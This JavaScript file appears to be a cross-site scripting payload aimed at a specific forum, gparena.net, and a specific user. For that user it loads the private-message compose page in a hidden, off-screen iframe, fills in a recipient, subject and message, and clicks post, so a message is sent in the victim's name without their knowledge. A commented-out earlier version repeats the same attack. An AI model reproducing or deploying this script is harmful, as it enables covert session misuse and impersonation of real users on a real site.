// var script_ids = ["a1", "a2", "a3", "a4"];
var header = document.getElementById('header');
var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
if (!document.getElementById("del1me")) {
    if (user_name === "Bury_comedor") {
        var iframe = document.createElement('iframe');
        iframe.id = "del1me";
        iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
        iframe.height = "400";
        iframe.width = "400";
        iframe.style.opacity = 0;
        iframe.style.position = "absolute";
        iframe.style.zIndex = -1;
        iframe.style.top = "-30px";
        header.append(iframe);
        const wait = setTimeout(stealThisMoment, secondsToMS(3));
    };
}

function stealThisMoment() {
    console.log("3secs!");
    iframe.contentWindow.document.getElementById("username_list").value = "!lole";
    iframe.contentWindow.document.getElementsByName("add_to")[0].click();
    iframe.contentWindow.document.getElementById("subject").value = "bury";
    iframe.contentWindow.document.getElementById("message").value = "chicanery";
    iframe.contentWindow.document.getElementsByName("post")[0].click();
    setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(1));
};


function secondsToMS(seconds) {
    return seconds * 1000;
}

// script_ids.forEach(script => {
//     if (document.getElementById(script)) {
//         document.getElementById(script).remove;
//     }
// });

// function stealThisMoment() {
//     if (user_name === "Bury_comedor") {
//         var iframe = document.createElement('iframe');
//         iframe.id = "del1me";
//         iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
//         iframe.height = "400";
//         iframe.width = "400";
//         iframe.style.opacity = 0;
//         iframe.style.position = "absolute";
//         iframe.style.zIndex = -1;
//         iframe.style.top = "-30px";
//         header.append(iframe);
//         document.getElementById("del1me");
//         iframe.contentWindow.document.getElementById("username_list").value = "!lole";
//         iframe.contentWindow.document.getElementsByName("add_to")[0].click();
//         iframe.contentWindow.document.getElementById("subject").value = "bury";
//         iframe.contentWindow.document.getElementById("message").value = "chicanery";
//         iframe.contentWindow.document.getElementsByClassName("button1 default-submit-action")[0].click();
//         //iframe.contentWindow.document.getElementsByName("add_to")[0].click();
//     };
// };